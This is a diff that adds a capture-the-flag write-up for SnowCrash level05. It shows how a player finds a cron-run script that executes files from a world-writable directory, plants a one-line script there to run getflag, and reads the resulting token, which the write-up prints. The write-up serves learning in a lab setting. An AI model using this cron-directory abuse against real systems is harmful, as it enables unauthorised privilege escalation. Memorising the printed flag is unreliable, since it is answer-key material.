@@ -1,0 +1,68 @@
+For this one, we have a message at connection
+"You have new mail."
+That's mean we probably have a repetitive task running
+
+try to find something with "flag05"
+```
+level05@SnowCrash:~$ ls -lRa / 2>/dev/null | grep flag05
+-rwxr-x---  1 flag05  flag05      94 Mar  5  2016 openarenaserver
+-rwxr-x---+ 1 flag05  flag05      94 Mar  5  2016 openarenaserver
+```
+
+Now locate it :
+```
+level05@SnowCrash:~$ whereis openarenaserver
+openarenaserver: /usr/sbin/openarenaserver
+```
+
+Take a look in this :
+```
+level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+```
+
+This script execute scripts located in /opt/openarenaserver
+
+Let's take a look :
+```
+level05@SnowCrash:~$ ls -l /opt
+total 0
+drwxrwxr-x+ 2 root root 40 Dec  7 17:05 openarenaserver
+```
+The + mean folder have extended permissions :
+```
+level05@SnowCrash:~$ getfacl /opt/openarenaserver/
+getfacl: Removing leading '/' from absolute path names
+# file: opt/openarenaserver/
+# owner: root
+# group: root
+user::rwx
+user:level05:rwx
+user:flag05:rwx
+group::r-x
+mask::rwx
+other::r-x
+default:user::rwx
+default:user:level05:rwx
+default:user:flag05:rwx
+default:group::r-x
+default:mask::rwx
+default:other::r-x
+```
+
+We can create our own script inside
+```
+level05@SnowCrash:~$ echo "/bin/getflag > /tmp/result" > /opt/openarenaserver/exploit.sh
+level05@SnowCrash:~$ chmod +x /opt/openarenaserver/exploit.sh
+```
+
+Now we wait a bit, then cat "/tmp/result" :
+```
+level05@SnowCrash:~$ cat /tmp/result
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+```
